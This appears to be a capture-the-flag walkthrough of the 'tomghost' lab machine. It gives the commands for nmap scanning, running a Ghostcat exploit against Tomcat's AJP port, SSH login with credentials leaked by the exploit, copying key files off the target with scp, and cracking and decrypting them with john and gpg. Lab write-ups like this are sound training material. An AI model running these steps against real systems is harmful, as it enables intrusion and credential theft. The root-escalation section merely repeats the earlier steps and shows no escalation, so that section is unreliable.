tomghost
===

### environment
KALI Linux ip 10.10.214.53

TARGET 10.10.94.155
###  Flags

- [x] Compromise this machine and obtain user.txt

First step, we namp scan which port are open and vulnerability

```
nmap -sV -sC 10.10.94.155
```

We know port 22 53 8009 8080 are open

![image](https://user-images.githubusercontent.com/67756786/194012149-caca49b0-a4a8-423f-a47e-501d61940d3d.png)

Now we visit 8080 page, and enumerate it.

![image](https://user-images.githubusercontent.com/67756786/194012721-d4a3b640-9642-47dc-86a5-e91f0f0d3ff6.png)

Enumerate web page

![image](https://user-images.githubusercontent.com/67756786/194013210-82d401e5-fba0-4457-9a46-6133945d398d.png)

In short , we got Apache Tomcat V9.0.30 and /examples. These two points seems to be injection.

Now we search vulnerability on google.

Tomcat can be RCE if that is old version.

V9.0.30 is't fixex version, we can use this vulnerability.
![image](https://user-images.githubusercontent.com/67756786/194015465-89303821-d433-475b-8198-72e99c2d1357.png)

/examples doesn't seem to have vulnerability

https://saucer-man.com/information_security/507.html

Now we git clone RCE python script, and excute this.

```
git clone https://github.com/Hancheng-Lei/Hacking-Vulnerability-CVE-2020-1938-Ghostcat.git
python2.7 CVE-2020-1938.py 10.10.94.155 -p 8009 -f WEB-INF/web.xml
```
We can use this informaion to connet ssh .(skyfuck:8730281lkjlkjdqlksalks)
![image](https://user-images.githubusercontent.com/67756786/194019203-449285bb-0a0d-4b72-9ad3-88cc617b836f.png)

```
ssh skyfuck@10.10.94.155
```

We got first shell, and then confirm are we sudoer.

skyfuck should common user.

![image](https://user-images.githubusercontent.com/67756786/194020834-152a82e3-f7a4-4948-ae0d-aca7634df2ed.png)

Into /home dictionary confirm which user on machine.

![image](https://user-images.githubusercontent.com/67756786/194021167-9a11ae0d-4f72-4065-8ed9-91dab0f90d34.png)

Into merlin dictionary , we got user.txt.
![image](https://user-images.githubusercontent.com/67756786/194021208-7ed24479-6a0c-499b-a945-3680d1e164ec.png)

Into skyfuck dictionary, we got one asc file and pgp file.

![image](https://user-images.githubusercontent.com/67756786/194021490-89f47a28-dfec-4722-9f39-77986505bee9.png)

Scp both file.
```
scp tryhackme.asc root@10.10.214.53:~/tryhackme.asc
scp credential.pgp root@10.10.214.53:~/credential.pgp
```
check tryhackme.asc content, we know this file is PGP private key.

![image](https://user-images.githubusercontent.com/67756786/194023131-9d9ffcea-8bef-4be5-9dca-5489fd684eb6.png)

Now we can use john to crack.

```
gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Now we have gpg private key to crack credential.pgp
![image](https://user-images.githubusercontent.com/67756786/194025726-97709d6a-db3f-4287-bea7-7178bf98bdcd.png)

import private key, first.
```
gpg --import tryhackme.asc
```
![image](https://user-images.githubusercontent.com/67756786/194026019-301bf640-69a3-4209-92ce-e986bd061c99.png)

```
gpg --decrypt credential.pgp
```

![image](https://user-images.githubusercontent.com/67756786/194026271-29a81f59-490b-4c2f-bb94-b25a84bb160e.png)


- [x] Escalate privileges and obtain root.txt

Scp both file.
```
scp tryhackme.asc root@10.10.214.53:~/tryhackme.asc
scp credential.pgp root@10.10.214.53:~/credential.pgp
```
check tryhackme.asc content, we know this file is PGP private key.

![image](https://user-images.githubusercontent.com/67756786/194023131-9d9ffcea-8bef-4be5-9dca-5489fd684eb6.png)

Now we can use john to crack.

```
gpg2john tryhackme.asc > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
Now we have gpg private key to crack credential.pgp
![image](https://user-images.githubusercontent.com/67756786/194025726-97709d6a-db3f-4287-bea7-7178bf98bdcd.png)

import private key, first.
```
gpg --import tryhackme.asc
```
![image](https://user-images.githubusercontent.com/67756786/194026019-301bf640-69a3-4209-92ce-e986bd061c99.png)

```
gpg --decrypt credential.pgp
```

![image](https://user-images.githubusercontent.com/67756786/194026271-29a81f59-490b-4c2f-bb94-b25a84bb160e.png)
